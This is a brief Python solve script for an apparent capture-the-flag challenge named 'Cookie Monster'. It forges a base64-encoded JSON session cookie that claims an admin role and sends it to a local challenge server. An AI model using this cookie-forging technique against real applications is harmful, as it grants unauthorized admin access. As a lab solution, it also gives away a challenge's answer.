# Solve script for the Cookie Monster example challenge.
# Usage: python3 solve.py [url]
import base64
import json
import sys

import requests

url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1337/"

forged = base64.b64encode(json.dumps({"user": "guest", "role": "admin"}).encode()).decode()
print(f"forged cookie: {forged}")

resp = requests.get(url, cookies={"session": forged}, timeout=5)
print(resp.text.strip())
